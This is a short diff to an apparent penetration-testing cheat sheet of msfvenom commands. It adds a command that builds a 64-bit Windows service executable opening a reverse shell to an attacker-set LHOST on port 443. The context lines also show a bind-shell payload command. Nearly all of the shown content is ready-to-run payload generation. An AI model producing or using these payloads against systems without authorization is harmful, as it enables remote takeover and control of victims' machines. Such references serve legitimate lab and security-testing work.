@@ -1,5 +1,5 @@
 # MSFVENOM
-## Windows Binary (.exe)
+## Windows Binary (.exe) executable
 ### 32 Bit (x86)
 #### Reverse Shell
 ```bash
@@ -17,6 +17,11 @@ msfvenom -p windows/shell_bind_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -b "\x
 ```
 
 ### 64 Bit (x64)
+
+#### service
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f service-exe -o service.exe
+```
 
 #### Reverse Shell
 ```bash
